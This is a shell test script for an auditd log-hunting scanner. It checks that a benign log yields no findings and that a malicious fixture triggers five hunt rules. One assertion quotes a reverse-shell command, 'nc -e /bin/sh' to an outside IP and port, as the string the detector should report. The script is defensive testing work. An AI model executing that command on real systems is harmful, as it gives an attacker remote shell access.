#!/bin/sh
# Runs the real scanner.py against a benign real-shaped auditd log and
# a deliberately malicious one, asserting specific hunt_ids fire.
set -e
cd "$(dirname "$0")/.."

OUT=/tmp/lh_test_$$
mkdir -p "$OUT"

run() {
  label="$1"; file="$2"
  python3 scanner.py "$file" --json "$OUT/$label.json" --fail-on any > "$OUT/$label.txt" 2>&1
  echo $? > "$OUT/$label.exit"
}

assert_exit() {
  label="$1"; expected="$2"
  actual=$(cat "$OUT/$label.exit")
  [ "$actual" = "$expected" ] && echo "PASS: $label exit code $actual" \
    || { echo "FAIL: $label expected exit $expected, got $actual"; cat "$OUT/$label.txt"; rm -rf "$OUT"; exit 1; }
}

assert_fires() {
  label="$1"; hunt_id="$2"
  python3 -c "
import json, sys
findings = json.load(open('$OUT/$label.json'))
sys.exit(0 if any(f['hunt_id'] == '$hunt_id' for f in findings) else 1)
" && echo "PASS: $label -> $hunt_id fired" \
  || { echo "FAIL: $label -> $hunt_id did not fire"; cat "$OUT/$label.txt"; rm -rf "$OUT"; exit 1; }
}

echo "== Benign =="
set +e; run benign test_fixtures/benign_audit.log; set -e
cat "$OUT/benign.txt"
assert_exit benign 0
python3 -c "
import json, sys
findings = json.load(open('$OUT/benign.json'))
sys.exit(0 if len(findings) == 0 else 1)
" && echo "PASS: benign produced zero findings" \
  || { echo "FAIL: benign unexpectedly produced findings"; rm -rf "$OUT"; exit 1; }

echo
echo "== Malicious =="
set +e; run malicious test_fixtures/malicious_audit.log; set -e
cat "$OUT/malicious.txt"
assert_exit malicious 1
for hid in LHUNT-1 LHUNT-2 LHUNT-3 LHUNT-4 LHUNT-5; do
  assert_fires malicious "$hid"
done

# The multi-line-record grouping is the real engineering content here -
# confirm LHUNT-1's reported command is the FULL joined EXECVE argv
# ("bash -c nc -e /bin/sh 203.0.113.9 4444"), not just one fragment,
# proving SYSCALL/EXECVE/PATH lines were correctly correlated by their
# shared audit ID rather than read as independent, unrelated lines.
python3 -c "
import json
findings = json.load(open('$OUT/malicious.json'))
lhunt1 = [f for f in findings if f['hunt_id'] == 'LHUNT-1'][0]
assert 'nc -e /bin/sh 203.0.113.9 4444' in lhunt1['message'], lhunt1['message']
print('PASS: EXECVE argv was correctly joined and correlated to its SYSCALL record')
"

rm -rf "$OUT"
echo
echo "All tests passed."
